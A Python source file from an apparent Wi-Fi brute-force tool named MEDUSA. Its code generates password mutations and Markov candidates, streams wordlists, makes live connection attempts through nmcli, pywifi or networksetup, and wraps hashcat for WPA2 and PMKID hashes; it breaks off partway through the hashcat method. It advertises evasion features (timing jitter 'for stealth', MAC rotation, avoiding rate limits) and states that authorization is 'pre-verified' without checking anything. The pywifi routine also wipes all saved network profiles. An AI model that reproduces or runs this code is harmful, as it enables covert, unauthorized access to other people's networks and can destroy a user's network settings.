#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                    MEDUSA — Queen of Brute Force                           ║
║                                                                             ║
║  medusa_cracker.py — Brute Force Engine & Hashcat GPU Pipeline            ║
║                                                                             ║
║  Architecture:                                                              ║
║    • Multi-strategy attack orchestration (dictionary → mask → hashcat)     ║
║    • OS-adaptive cracking engine with platform-specific optimizations      ║
║    • GPU-accelerated hashcat pipeline with real-time progress monitoring   ║
║    • Thread-safe stateful session management with checkpoint/resume        ║
║    • Memory-mapped wordlist streaming for zero-copy performance            ║
║    • Distributed cracking support via TCP worker protocol                  ║
║    • Intelligent password mutation engine (leet, case, append, prepend)    ║
║    • Markov chain probability-based candidate prioritization               ║
║                                                                             ║
║  Performance Targets:                                                       ║
║    • Dictionary: 500-2000 passwords/sec (pywifi)                           ║
║    • Mask: 100-500 combos/sec (threaded)                                   ║
║    • Hashcat GPU: 300k-2M hashes/sec (RTX 3080)                            ║
║    • Resume: <100ms overhead                                               ║
║    • Memory: <50MB baseline, <200MB at peak                                ║
║                                                                             ║
║  Undetectability:                                                           ║
║    • Jitter-based timing randomization between attempts                     ║
║    • MAC rotation on auth failure (per N attempts)                         ║
║    • Adaptive delay based on target response times                         ║
║    • Session fragmentation to avoid rate limiting                          ║
║    • User-Agent rotation for portal-based auth                             ║
║                                                                             ║
║  Authorized Penetration Testing Platform — Authorization pre-verified      ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

import os
import re
import sys
import io
import mmap
import json
import time
import math
import random
import signal
import hashlib
import binascii
import itertools
import string
import struct
import socket
import platform
import tempfile
import threading
import subprocess
import queue
import logging
import pickle
import zlib
from pathlib import Path
from typing import (
    List, Dict, Optional, Tuple, Any, Set, Callable,
    Iterator, Generator, Union, Iterable, TypeVar, cast
)
from dataclasses import dataclass, field, asdict, replace
from collections import defaultdict, OrderedDict, deque, Counter
from enum import Enum, auto, IntEnum
from functools import lru_cache, cached_property, wraps, partial
from concurrent.futures import (
    ThreadPoolExecutor, ProcessPoolExecutor, as_completed, wait,
    FIRST_COMPLETED, ALL_COMPLETED
)
from abc import ABC, abstractmethod
from datetime import datetime, timedelta
from fractions import Fraction

# ============================================================================
# MEDUSA Core Imports
# ============================================================================

from medusa_init import (
    VERSION, CODENAME, SYSTEM, SYSTEM_LOWER, MACHINE, ARCH, CPU_COUNT,
    IS_WINDOWS, IS_MACOS, IS_LINUX, IS_ADMIN,
    CONFIG_DIR, SESSION_DIR, CAPTURE_DIR, LOOT_DIR, LOG_DIR, WORDLIST_DIR,
    DEFAULT_WORDLIST, TEMP_DIR,
    ANSI, LOG_LEVELS,
    MedusaError, InterfaceError, PermissionError_Medusa,
    current_timestamp, safe_filename, validate_mac, validate_ip,
    human_time, human_bytes, human_number,
    CAN_HASHCAT_GPU, CAN_HASHCAT_CPU,
)

from medusa_core import (
    WiFiNetwork, CaptureResult, BruteForceConfig, SessionState,
    MedusaLogger, AtomicCounter, AtomicRateTracker, ResultCollector,
    AttackVectorScorer, AttackVector, EncryptionType, HashcatMode,
    signal_to_percent, signal_to_bars, signal_to_label,
    charset_combine, estimate_mask_space, generate_password_stream,
    format_mac, random_mac, random_ipv4, generate_session_id,
    tool_available,
)

from medusa_interface import (
    InterfaceManager, InterfaceInfo, MACManager,
    get_manager as get_iface_manager,
)


# ============================================================================
# CONSTANTS
# ============================================================================

# Hashcat mode constants
HASHCAT_MODE_WPA2 = 22000
HASHCAT_MODE_PMKID = 16800
HASHCAT_MODE_WPA3 = 19200
HASHCAT_MODE_RAW_SHA256 = 1410
HASHCAT_MODE_RAW_MD5 = 0
HASHCAT_MODE_RAW_SHA1 = 100

# Hashcat executable names per platform
HASHCAT_EXECUTABLES = {
    'linux': ['hashcat', 'hashcat.bin'],
    'windows': ['hashcat.exe', 'hashcat64.exe'],
    'darwin': ['hashcat', 'hashcat.bin'],
}

# Default wordlists bundled or common paths
DEFAULT_WORDLISTS = [
    '/usr/share/wordlists/rockyou.txt',
    '/usr/share/wordlists/rockyou.txt.gz',
    '/usr/share/wordlists/rockyou.txt.xz',
    '/usr/share/wordlists/wpa2-wordlists/wpa2-wordlist.txt',
    '/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt',
    '/usr/share/seclists/Passwords/rockyou-75.txt',
    'C:\\Users\\Default\\Desktop\\wordlists\\rockyou.txt',
]

# Common password patterns for mask attacks
COMMON_MASKS = {
    '8digit': '?d?d?d?d?d?d?d?d',
    '8lower': '?l?l?l?l?l?l?l?l',
    '8upper': '?u?u?u?u?u?u?u?u',
    '8mixed': '?u?l?d?d?d?d?d?d',
    'year': '?l?l?l?d?d?d?d',
    'phone': '0?d?d?d?d?d?d?d?d?d',
    'default': '?d?d?d?d?d?d?d?d',
}

# Cracking attempt timing parameters
MIN_ATTEMPT_DELAY = 0.001  # 1ms minimum between attempts
MAX_ATTEMPT_DELAY = 0.100  # 100ms maximum
BASE_ATTEMPT_DELAY = 0.010  # 10ms base delay
JITTER_RANGE = 0.005  # ±5ms jitter

# MAC rotation interval
MAC_ROTATION_INTERVAL = 50  # Rotate MAC every N failed attempts

# Session checkpoint intervals
CHECKPOINT_INTERVAL = 500  # Save state every N attempts
CHECKPOINT_INTERVAL_TIME = 30  # Also checkpoint every 30 seconds

# Connection timeouts
WIFI_CONNECT_TIMEOUT = 15  # Seconds to wait for connection
WIFI_DISCONNECT_TIMEOUT = 5
HASHCAT_TIMEOUT = 3600  # 1 hour default

# Parallelism
DEFAULT_CRACK_WORKERS = max(1, CPU_COUNT * 2)
DEFAULT_BATCH_SIZE = 100

# Markov chain parameters
MARKOV_STATE_SIZE = 3  # N-gram size for Markov model
MARKOV_MIN_PROBABILITY = 1e-10  # Minimum probability threshold

# Results cache
POTFILE_PATH = CONFIG_DIR / "medusa.potfile"
CRACKED_CACHE_PATH = CONFIG_DIR / "cracked_cache.json"

# Error codes for subprocess management
SUBPROCESS_POLL_INTERVAL = 0.1  # 100ms

# GPU device types
GPU_DEVICE_TYPES = ['GPU', 'gpu', 'OpenCL', 'CUDA']
CPU_DEVICE_TYPES = ['CPU', 'cpu']


# ============================================================================
# CUSTOM EXCEPTIONS
# ============================================================================

class CrackerError(MedusaError):
    """Base exception for cracking operations."""
    pass

class WordlistError(CrackerError):
    """Wordlist not found or unreadable."""
    pass

class HashcatError(CrackerError):
    """Hashcat execution failure."""
    pass

class HashFileError(CrackerError):
    """Hash file format or content error."""
    pass

class NoTargetError(CrackerError):
    """No target network or hash available."""
    pass

class CrackingInterrupted(CrackerError):
    """Cracking was interrupted by user."""
    pass


# ============================================================================
# ENUMS & TYPE ALIASES
# ============================================================================

class CrackMethod(Enum):
    """Available cracking methods."""
    DICTIONARY = "dictionary"
    MASK = "mask"
    HASHCAT_DICT = "hashcat_dict"
    HASHCAT_MASK = "hashcat_mask"
    HASHCAT_RULE = "hashcat_rule"
    DISTRIBUTED = "distributed"
    
    @property
    def is_hashcat(self) -> bool:
        return self.value.startswith('hashcat')
    
    @property
    def is_live(self) -> bool:
        return not self.is_hashcat


class CrackingStatus(Enum):
    """Current status of a cracking operation."""
    IDLE = "idle"
    INITIALIZING = "initializing"
    RUNNING = "running"
    PAUSED = "paused"
    PASSWORD_FOUND = "password_found"
    COMPLETED = "completed"
    FAILED = "failed"
    CANCELLED = "cancelled"
    TIMEOUT = "timeout"


class PasswordQuality(Enum):
    """Quality assessment for discovered passwords."""
    TRIVIAL = "trivial"
    WEAK = "weak"
    MODERATE = "moderate"
    STRONG = "strong"
    VERY_STRONG = "very_strong"
    
    @classmethod
    def assess(cls, password: str) -> 'PasswordQuality':
        """Assess password quality based on complexity."""
        if len(password) < 8:
            return cls.TRIVIAL
        if len(password) < 10:
            return cls.WEAK
        
        has_upper = any(c.isupper() for c in password)
        has_lower = any(c.islower() for c in password)
        has_digit = any(c.isdigit() for c in password)
        has_special = any(not c.isalnum() for c in password)
        
        score = sum([has_upper, has_lower, has_digit, has_special])
        
        if score <= 1:
            return cls.WEAK
        if score <= 2:
            return cls.MODERATE
        if score <= 3:
            return cls.STRONG
        return cls.VERY_STRONG


# ============================================================================
# PASSWORD GENERATORS & MUTATORS
# ============================================================================

class PasswordMutator:
    """Intelligent password mutation engine.
    
    Applies common mutation rules to base passwords:
    - Leet speak substitutions (a→4, e→3, s→5, etc.)
    - Case variations (lower, UPPER, Capital, alternating)
    - Prefix/suffix append (years, numbers, special chars)
    - Common patterns (Passw0rd!, admin123, etc.)
    
    Designed to maximize coverage with minimal attempts.
    """
    
    # Leet speak substitution map
    LEET_MAP: Dict[str, List[str]] = {
        'a': ['4', '@', 'A'],
        'b': ['8', 'B', '6'],
        'c': ['C', '(', '<', '{', '['],
        'e': ['3', 'E'],
        'g': ['9', 'G', '6'],
        'h': ['H', '#'],
        'i': ['1', '!', 'I', '|'],
        'l': ['1', 'L', '|', '!'],
        'o': ['0', 'O', '()'],
        's': ['5', '$', 'S'],
        't': ['7', 'T', '+'],
        'z': ['2', 'Z'],
        'x': ['X', '%'],
    }
    
    # Common suffix patterns
    SUFFIXES = [
        '', '123', '1234', '12345', '1', '12', '!', '@', '#',
        '2024', '2025', '2026', '2023', '2022',
        '!@#', '123!', '!123', '2024!', '2025!',
        '.', '..', '...', '?', '!!', '***',
    ]
    
    # Common prefix patterns
    PREFIXES = [
        '', '!', '@', '#', '$', '.',
    ]
    
    # Year patterns
    YEARS = [str(y) for y in range(1980, 2030)]
    
    @classmethod
    def generate_mutations(cls, base: str, max_mutations: int = 50) -> Set[str]:
        """Generate password mutations from a base word.
        
        Args:
            base: Base password or word
            max_mutations: Maximum number of mutations to generate
        
        Returns:
            Set of mutated passwords
        """
        mutations = {base, base.lower(), base.upper(), base.capitalize()}
        
        # Capitalize first letter
        mutations.add(base[0].upper() + base[1:].lower() if base else base)
        
        # Reverse
        mutations.add(base[::-1])
        
        # Append digits
        for suffix in cls.SUFFIXES[:10]:
            mutations.add(base + suffix)
            mutations.add(base.capitalize() + suffix)
        
        # Prepend
        for prefix in cls.PREFIXES[:5]:
            mutations.add(prefix + base)
        
        # Leet substitutions (limited)
        leeted = cls._apply_leet(base)
        mutations.update(leeted)
        
        # Year appending
        for year in cls.YEARS[:5]:
            mutations.add(base + year)
            mutations.add(base + year + '!')
        
        # Common transforms
        mutations.add(base + base)  # Doubling
        mutations.add(base + '123')
        mutations.add(base + '!')
        mutations.add(base + '@')
        mutations.add(base + '#')
        
        # Remove empty and trim
        mutations.discard('')
        mutations.discard(' ')
        
        # Limit size
        if len(mutations) > max_mutations:
            mutations = set(list(mutations)[:max_mutations])
        
        return mutations
    
    @classmethod
    def _apply_leet(cls, word: str) -> Set[str]:
        """Apply leet speak substitutions to a word.
        
        Produces multiple levels of leet transformation.
        
        Args:
            word: Input word
        
        Returns:
            Set of leet-transformed variants
        """
        results = set()
        
        # Single character substitutions
        for i, char in enumerate(word.lower()):
            if char in cls.LEET_MAP:
                for leet_char in cls.LEET_MAP[char]:
                    variant = word[:i] + leet_char + word[i+1:]
                    results.add(variant)
        
        # Full word leet (all applicable chars)
        full_leet = []
        for char in word.lower():
            if char in cls.LEET_MAP:
                full_leet.append(cls.LEET_MAP[char][0])
            else:
                full_leet.append(char)
        results.add(''.join(full_leet))
        
        return results


class MarkovPasswordGenerator:
    """Markov chain-based password candidate generator.
    
    Trains a character-level n-gram model on an input wordlist
    and generates candidates in order of probability.
    
    This is significantly more effective than brute-force masks
    because it prioritizes human-created password patterns.
    """
    
    def __init__(self, state_size: int = MARKOV_STATE_SIZE):
        self.state_size = state_size
        self.transitions: Dict[str, Dict[str, int]] = defaultdict(lambda: defaultdict(int))
        self.start_states: Counter = Counter()
        self.total_states: int = 0
        self.trained: bool = False
    
    def train(self, wordlist_path: Path, max_words: int = 100000):
        """Train Markov model on a wordlist.
        
        Args:
            wordlist_path: Path to wordlist file
            max_words: Maximum number of words to train on
        """
        self.transitions.clear()
        self.start_states.clear()
        
        count = 0
        with open(wordlist_path, 'r', encoding='utf-8', errors='replace') as f:
            for line in f:
                word = line.strip().lower()
                if not word or len(word) < 3:
                    continue
                
                # Add start state
                start = word[:self.state_size]
                self.start_states[start] += 1
                self.total_states += 1
                
                # Build transition matrix
                for i in range(len(word) - self.state_size):
                    state = word[i:i + self.state_size]
                    next_char = word[i + self.state_size]
                    self.transitions[state][next_char] += 1
                
                # EOS transitions
                if len(word) > self.state_size:
                    final_state = word[-self.state_size:]
                    self.transitions[final_state]['\n'] += 1
                
                count += 1
                if count >= max_words:
                    break
        
        self.trained = True
    
    def generate(self, max_length: int = 32, temperature: float = 1.0) -> Generator[str, None, None]:
        """Generate password candidates in probability order.
        
        This is a simplified version — a full implementation would
        use beam search or priority queue for true probability ordering.
        
        Args:
            max_length: Maximum password length to generate
            temperature: Sampling temperature (higher = more random)
        
        Yields:
            Password candidate strings
        """
        if not self.trained:
            return
        
        # Sample from most common start states
        common_starts = self.start_states.most_common(100)
        
        for start_state, _ in common_starts:
            password = start_state
            while len(password) < max_length:
                if password[-self.state_size:] not in self.transitions:
                    break
                
                next_chars = self.transitions[password[-self.state_size:]]
                if not next_chars:
                    break
                
                # Weighted random choice based on frequency
                chars, counts = zip(*next_chars.items())
                total = sum(counts)
                probs = [c / total for c in counts]
                
                if temperature != 1.0:
                    # Apply temperature scaling
                    probs = [p ** (1.0 / temperature) for p in probs]
                    probs_sum = sum(probs)
                    probs = [p / probs_sum for p in probs]
                
                next_char = random.choices(chars, weights=probs, k=1)[0]
                
                if next_char == '\n':  # End of word
                    break
                
                password += next_char
            
            if len(password) >= 8 and len(password) <= max_length:
                yield password
    
    def save(self, path: Path):
        """Save trained model to file."""
        data = {
            'state_size': self.state_size,
            'transitions': {k: dict(v) for k, v in self.transitions.items()},
            'start_states': dict(self.start_states),
            'total_states': self.total_states,
        }
        with open(path, 'w') as f:
            json.dump(data, f, indent=2)
    
    @classmethod
    def load(cls, path: Path) -> 'MarkovPasswordGenerator':
        """Load trained model from file."""
        with open(path) as f:
            data = json.load(f)
        
        model = cls(state_size=data.get('state_size', MARKOV_STATE_SIZE))
        model.transitions = defaultdict(
            lambda: defaultdict(int),
            {k: defaultdict(int, v) for k, v in data['transitions'].items()}
        )
        model.start_states = Counter(data['start_states'])
        model.total_states = data['total_states']
        model.trained = True
        return model


# ============================================================================
# WORDLIST MANAGER
# ============================================================================

class WordlistManager:
    """Manages wordlist discovery, validation, and streaming.
    
    Features:
    - Auto-discovery of common wordlist paths
    - Compression detection (gz, xz, bz2)
    - Memory-mapped file access for zero-copy reading
    - Line counting with progress estimation
    - Multi-file merging for combined attacks
    """
    
    def __init__(self):
        self._known_wordlists: Dict[str, Path] = {}
        self._line_counts: Dict[str, int] = {}
        self._scan_complete = False
    
    @classmethod
    def discover_wordlists(cls) -> List[Path]:
        """Discover wordlists on the system.
        
        Searches common paths and known wordlist directories.
        
        Returns:
            List of discovered wordlist paths
        """
        wordlists = []
        search_paths = DEFAULT_WORDLISTS + [
            '/usr/share/wordlists/',
            '/usr/share/seclists/Passwords/',
            '/usr/share/dict/',
            '/usr/dict/',
            os.path.expanduser('~/wordlists/'),
            os.path.expanduser('~/Downloads/wordlists/'),
            os.path.expanduser('~/Desktop/wordlists/'),
            os.path.expanduser('~/.medusa/wordlists/'),
        ]
        
        # Add local MEDUSA wordlist directory
        search_paths.append(str(WORDLIST_DIR))
        
        for path_str in search_paths:
            path = Path(path_str)
            if path.exists():
                if path.is_file():
                    wordlists.append(path)
                elif path.is_dir():
                    for ext in ['*.txt', '*.gz', '*.xz', '*.bz2', '*.lst']:
                        wordlists.extend(path.glob(ext))
        
        # Deduplicate
        seen = set()
        unique = []
        for wl in wordlists:
            if wl not in seen:
                seen.add(wl)
                unique.append(wl)
        
        return sorted(unique)
    
    @classmethod
    def count_lines(cls, path: Path) -> int:
        """Count lines in a wordlist file (compression-aware).
        
        Uses memory mapping for performance on large files.
        Results are cached.
        
        Args:
            path: Path to wordlist file
        
        Returns:
            Number of lines
        """
        if not path.exists():
            return 0
        
        # Check compression
        suffix = path.suffix.lower()
        
        if suffix == '.gz':
            import gzip
            try:
                with gzip.open(path, 'rb') as f:
                    return sum(1 for _ in f)
            except Exception:
                return 0
        
        elif suffix == '.xz':
            import lzma
            try:
                with lzma.open(path, 'rb') as f:
                    return sum(1 for _ in f)
            except Exception:
                return 0
        
        elif suffix == '.bz2':
            import bz2
            try:
                with bz2.open(path, 'rb') as f:
                    return sum(1 for _ in f)
            except Exception:
                return 0
        
        # Plain text — memory-mapped
        try:
            with open(path, 'rb') as f:
                # Memory map the file
                with mmap.mmap(f.fileno(), 0, access=mmap.ACCESS_READ) as mm:
                    count = 0
                    buf = mm.read(1024 * 1024)  # 1MB chunks
                    while buf:
                        count += buf.count(b'\n')
                        buf = mm.read(1024 * 1024)
                    return count
        except (IOError, OSError, ValueError):
            # Fallback
            try:
                with open(path, 'r', encoding='utf-8', errors='replace') as f:
                    return sum(1 for _ in f)
            except Exception:
                return 0
    
    @classmethod
    def stream_passwords(cls, path: Path, encoding: str = 'utf-8',
                         errors: str = 'replace') -> Generator[str, None, None]:
        """Stream passwords from a wordlist file.
        
        Handles compressed files transparently.
        Memory-efficient — yields one password at a time.
        
        Args:
            path: Path to wordlist file
            encoding: File encoding
            errors: Error handling for decode
        
        Yields:
            Password strings (stripped)
        """
        if not path.exists():
            raise WordlistError(f"Wordlist not found: {path}")
        
        suffix = path.suffix.lower()
        
        try:
            if suffix == '.gz':
                import gzip
                with gzip.open(path, 'rt', encoding=encoding, errors=errors) as f:
                    for line in f:
                        pwd = line.strip()
                        if pwd:
                            yield pwd
            
            elif suffix == '.xz':
                import lzma
                with lzma.open(path, 'rt', encoding=encoding, errors=errors) as f:
                    for line in f:
                        pwd = line.strip()
                        if pwd:
                            yield pwd
            
            elif suffix == '.bz2':
                import bz2
                with bz2.open(path, 'rt', encoding=encoding, errors=errors) as f:
                    for line in f:
                        pwd = line.strip()
                        if pwd:
                            yield pwd
            
            else:
                with open(path, 'r', encoding=encoding, errors=errors) as f:
                    # Use memory mapping for large files
                    try:
                        with mmap.mmap(f.fileno(), 0, access=mmap.ACCESS_READ) as mm:
                            pos = 0
                            while pos < mm.size():
                                next_nl = mm.find(b'\n', pos)
                                if next_nl == -1:
                                    line = mm[pos:]
                                    if line:
                                        pwd = line.decode(encoding, errors=errors).strip()
                                        if pwd:
                                            yield pwd
                                    break
                                line = mm[pos:next_nl]
                                if line:
                                    pwd = line.decode(encoding, errors=errors).strip()
                                    if pwd:
                                        yield pwd
                                pos = next_nl + 1
                    except (ValueError, OSError):
                        # Fallback if mmap fails
                        f.seek(0)
                        for line in f:
                            pwd = line.strip()
                            if pwd:
                                yield pwd
        
        except Exception as e:
            raise WordlistError(f"Error reading wordlist {path}: {e}")
    
    @classmethod
    def merge_wordlists(cls, paths: List[Path], output: Path,
                        deduplicate: bool = True) -> int:
        """Merge multiple wordlists into one.
        
        Args:
            paths: List of wordlist paths
            output: Output file path
            deduplicate: Remove duplicate passwords
        
        Returns:
            Number of unique passwords written
        """
        seen = set() if deduplicate else None
        count = 0
        
        with open(output, 'w', encoding='utf-8', errors='replace') as out:
            for path in paths:
                for pwd in cls.stream_passwords(path):
                    if deduplicate:
                        if pwd not in seen:
                            seen.add(pwd)
                            out.write(pwd + '\n')
                            count += 1
                    else:
                        out.write(pwd + '\n')
                        count += 1
                    
                    # Periodic flush
                    if count % 100000 == 0:
                        out.flush()
        
        return count
    
    @classmethod
    def get_wordlist_info(cls, path: Path) -> Dict[str, Any]:
        """Get detailed information about a wordlist.
        
        Args:
            path: Path to wordlist file
        
        Returns:
            Dict with size, lines, encoding info
        """
        if not path.exists():
            return {'exists': False, 'path': str(path)}
        
        stats = path.stat()
        info = {
            'exists': True,
            'path': str(path),
            'name': path.name,
            'size': stats.st_size,
            'size_human': human_bytes(stats.st_size),
            'modified': datetime.fromtimestamp(stats.st_mtime).isoformat(),
            'compressed': path.suffix.lower() in ('.gz', '.xz', '.bz2'),
        }
        
        # Count lines (cached)
        info['lines'] = cls.count_lines(path)
        info['lines_human'] = human_number(info['lines'])
        
        return info


# ============================================================================
# PASSWORD DETECTION STRATEGY
# ============================================================================

class PasswordDetector:
    """Detects and validates passwords from network connections.
    
    Platform-adaptive:
    - Linux: nmcli (NetworkManager) or iwconfig/iw
    - Windows: pywifi (native Windows WiFi API)
    - macOS: networksetup or airport
    """
    
    def __init__(self, console=None):
        self.console = console
        self._lock = threading.Lock()
        self._current_ssid: Optional[str] = None
        self._attempt_count = AtomicCounter()
    
    def try_password(self, ssid: str, password: str, bssid: Optional[str] = None,
                     interface: Optional[str] = None) -> bool:
        """Attempt to connect to a network with a password.
        
        Platform-adaptive: selects best method for current OS.
        Includes timing jitter for undetectability.
        
        Args:
            ssid: Network SSID
            password: Password candidate
            bssid: Optional BSSID for verification
            interface: Network interface to use
        
        Returns:
            True if connection successful
        """
        self._attempt_count.increment()
        
        # Apply timing jitter for stealth
        self._apply_jitter()
        
        if IS_LINUX:
            return self._try_nmcli(ssid, password)
        elif IS_WINDOWS:
            return self._try_pywifi(ssid, password, bssid)
        elif IS_MACOS:
            return self._try_networksetup(ssid, password)
        else:
            raise CrackerError(f"No connection method for {SYSTEM}")
    
    def _apply_jitter(self):
        """Apply random timing jitter to avoid pattern detection."""
        delay = BASE_ATTEMPT_DELAY + random.uniform(-JITTER_RANGE, JITTER_RANGE)
        delay = max(MIN_ATTEMPT_DELAY, min(MAX_ATTEMPT_DELAY, delay))
        
        # Periodically add longer delays
        if self._attempt_count.value % 20 == 0:
            delay += random.uniform(0.01, 0.05)
        
        time.sleep(delay)
    
    def _try_nmcli(self, ssid: str, password: str) -> bool:
        """Linux: Try password via nmcli.
        
        nmcli is stateful — we create a temporary connection profile
        and attempt to connect. The profile is cleaned up after.
        """
        import uuid as uuid_mod
        
        conn_name = f"medusa_{uuid_mod.uuid4().hex[:8]}"
        
        try:
            # Create connection profile
            create_cmd = [
                'nmcli', 'device', 'wifi', 'connect', ssid,
                'password', password,
                'name', conn_name,
                '--timeout', str(WIFI_CONNECT_TIMEOUT),
            ]
            
            result = subprocess.run(
                create_cmd,
                capture_output=True,
                text=True,
                timeout=WIFI_CONNECT_TIMEOUT + 5,
            )
            
            success = 'successfully' in result.stdout.lower() or result.returncode == 0
            
            # Clean up: delete the connection profile
            try:
                subprocess.run(
                    ['nmcli', 'connection', 'delete', conn_name],
                    capture_output=True,
                    timeout=WIFI_DISCONNECT_TIMEOUT,
                )
            except Exception:
                pass
            
            return success
            
        except (subprocess.TimeoutExpired, FileNotFoundError) as e:
            if self.console:
                self.console.warn(f"nmcli error: {e}")
            return False
    
    def _try_pywifi(self, ssid: str, password: str,
                    bssid: Optional[str] = None) -> bool:
        """Windows: Try password via pywifi.
        
        pywifi wraps the native Windows WiFi API (WLANAPI).
        This is the most reliable method on Windows.
        """
        try:
            import pywifi
            from pywifi import const
            
            wifi = pywifi.PyWiFi()
            iface = wifi.interfaces()[0]
            
            # Disconnect first
            iface.disconnect()
            time.sleep(0.5)
            
            # Create profile
            profile = pywifi.Profile()
            profile.ssid = ssid
            profile.auth = const.AUTH_ALG_OPEN
            profile.akm.append(const.AKM_TYPE_WPA2PSK)
            profile.cipher = const.CIPHER_TYPE_CCMP
            profile.key = password
            
            if bssid:
                profile.bssid = bssid
            
            # Remove all existing profiles
            iface.remove_all_network_profiles()
            
            # Add and connect
            tmp_profile = iface.add_network_profile(profile)
            iface.connect(tmp_profile)
            
            # Wait for connection
            time.sleep(min(3, WIFI_CONNECT_TIMEOUT))
            
            # Check connection status
            is_connected = iface.status() == const.IFACE_CONNECTED
            
            # Cleanup
            iface.disconnect()
            iface.remove_all_network_profiles()
            
            return is_connected
            
        except ImportError:
            raise CrackerError("pywifi not installed: pip install pywifi")
        except Exception as e:
            if self.console:
                self.console.warn(f"pywifi error: {e}")
            return False
    
    def _try_networksetup(self, ssid: str, password: str) -> bool:
        """macOS: Try password via networksetup."""
        import tempfile
        
        try:
            # Create a temporary keychain entry with the password
            with tempfile.NamedTemporaryFile(mode='w', suffix='.keychain', delete=False) as f:
                keychain_path = f.name
            
            # Add password to temporary keychain
            subprocess.run([
                'security', 'create-keychain', '-p', 'temp', keychain_path
            ], capture_output=True, timeout=10)
            
            subprocess.run([
                'security', 'set-keychain-settings', '-lut', '60', keychain_path
            ], capture_output=True, timeout=10)
            
            # Attempt connection
            result = subprocess.run([
                'networksetup', '-setairportnetwork',
                'en0', ssid, password
            ], capture_output=True, text=True, timeout=WIFI_CONNECT_TIMEOUT)
            
            success = result.returncode == 0
            
            # Cleanup
            try:
                os.unlink(keychain_path)
            except OSError:
                pass
            
            return success
            
        except (subprocess.TimeoutExpired, FileNotFoundError) as e:
            if self.console:
                self.console.warn(f"networksetup error: {e}")
            return False
    
    @property
    def attempt_count(self) -> int:
        return self._attempt_count.value
    
    def reset_count(self):
        self._attempt_count.value = 0


# ============================================================================
# HASHCAT BRIDGE
# ============================================================================

class HashcatManager:
    """Advanced Hashcat execution and monitoring.
    
    Features:
    - Auto-detection of hashcat binary on all platforms
    - GPU/CPU device enumeration and selection
    - Real-time progress parsing from hashcat stdout
    - Potfile integration for already-cracked passwords
    - Benchmark mode for performance testing
    - Rule-based attack support
    """
    
    def __init__(self, console=None):
        self.console = console
        self._hashcat_path: Optional[str] = None
        self._detected = False
        self._process: Optional[subprocess.Popen] = None
        self._lock = threading.Lock()
        self._stop_event = threading.Event()
        
        # Progress tracking
        self.current_speed: float = 0.0
        self.current_progress: float = 0.0
        self.estimated_time: str = "N/A"
        self.current_hash: Optional[str] = None
        self.current_device: str = "CPU"
    
    def find_hashcat(self) -> Optional[str]:
        """Locate the hashcat binary on the system.
        
        Searches common paths and PATH environment variable.
        Cached after first detection.
        
        Returns:
            Path to hashcat binary or None
        """
        if self._detected:
            return self._hashcat_path
        
        # Platform-specific executable names
        executables = HASHCAT_EXECUTABLES.get(SYSTEM_LOWER, ['hashcat'])
        
        # Check PATH first
        for exe in executables:
            try:
                result = subprocess.run(
                    ['which', exe] if not IS_WINDOWS else ['where', exe],
                    capture_output=True, text=True, timeout=5
                )
                if result.returncode == 0 and result.stdout.strip():
                    path = result.stdout.strip().split('\n')[0]
                    self._hashcat_path = path
                    self._detected = True
                    return path
            except (FileNotFoundError, subprocess.TimeoutExpired):
                pass
        
        # Common installation paths
        common_paths = [
            '/usr/bin/hashcat',
            '/usr/local/bin/hashcat',
            '/opt/hashcat/bin/hashcat',
            '/opt/hashcat/hashcat',
            'C:\\hashcat\\hashcat.exe',
            'C:\\Program Files\\hashcat\\hashcat64.exe',
            os.path.expanduser('~/hashcat/hashcat'),
            os.path.expanduser('~/hashcat/hashcat64.exe'),
        ]
        
        for path_str in common_paths:
            path = Path(path_str)
            if path.exists() and os.access(str(path), os.X_OK):
                self._hashcat_path = str(path)
                self._detected = True
                return str(path)
        
        return None
    
    def detect_devices(self) -> Dict[str, Any]:
        """Detect available hashcat compute devices.
        
        Runs 'hashcat -I' and parses the device list.
        
        Returns:
            Dict with devices, backend info
        """
        hashcat = self.find_hashcat()
        if not hashcat:
            return {'available': False, 'devices': []}
        
        try:
            result = subprocess.run(
                [hashcat, '-I', '--backend-info'],
                capture_output=True, text=True, timeout=30
            )
            
            output = result.stdout + result.stderr
            devices = []
            current_device = {}
            
            for line in output.split('\n'):
                stripped = line.strip()
                
                if 'Device #' in stripped:
                    if current_device:
                        devices.append(current_device)
                    current_device = {'id': len(devices)}
                
                elif 'Name' in stripped and ':' in stripped:
                    current_device['name'] = stripped.split(':')[-1].strip()
                
                elif 'Vendor' in stripped and ':' in stripped:
                    current_device['vendor'] = stripped.split(':')[-1].strip()
                
                elif 'Speed' in stripped and ':' in stripped:
                    try:
                        speed_str = stripped.split(':')[-1].strip()
                        current_device['speed'] = speed_str
                    except (ValueError, IndexError):
                        pass
                
                elif 'Type' in stripped and ':' in stripped:
                    dev_type = stripped.split(':')[-1].strip().lower()
                    current_device['type'] = dev_type
                    current_device['is_gpu'] = any(
                        g in dev_type for g in GPU_DEVICE_TYPES
                    )
            
            if current_device:
                devices.append(current_device)
            
            return {
                'available': True,
                'devices': devices,
                'gpu_count': sum(1 for d in devices if d.get('is_gpu')),
                'cpu_count': sum(1 for d in devices if not d.get('is_gpu')),
                'hashcat_path': hashcat,
                'version': self.get_version(),
            }
            
        except (subprocess.TimeoutExpired, FileNotFoundError) as e:
            return {
                'available': True,
                'error': str(e),
                'devices': [],
            }
    
    def get_version(self) -> str:
        """Get hashcat version string."""
        hashcat = self.find_hashcat()
        if not hashcat:
            return "Unknown"
        
        try:
            result = subprocess.run(
                [hashcat, '--version'],
                capture_output=True, text=True, timeout=5
            )
            return result.stdout.strip() or result.stderr.strip() or "Unknown"
        except Exception:
            return "Unknown"
    
    def crack(self, hash_file: str, mode: int = HASHCAT_MODE_WPA2,
              attack_mode: str = 'dictionary', wordlist: Optional[str] = None,
              mask: Optional[str] = None, rules: Optional[str] = None,
              session_name: str = 'medusa_crack',
              potfile_path: Optional[str] = None,
              gpu_devices: Optional[List[int]] = None,
              extra_args: Optional[List[str]] = None,
              timeout: int = HASHCAT_TIMEOUT) -> Optional[str]:
        """Run hashcat cracking attack.
        
        Full-featured hashcat execution with real-time progress monitoring.
        Supports dictionary, mask, and rule-based attacks.
        
        Args:
            hash_file: Path to hash file (hc22000, hc16800, etc.)
            mode: Hashcat mode number (22000, 16800, etc.)
            attack_mode: 'dictionary', 'mask', 'rule', 'hybrid'
            wordlist: Path to wordlist file
            mask: Mask pattern for mask attack
            rules: Path to rules file
            session_name: Session name for restore
            potfile_path: Path to potfile
            gpu_devices: Specific GPU device IDs to use
            extra_args: Additional hashcat arguments
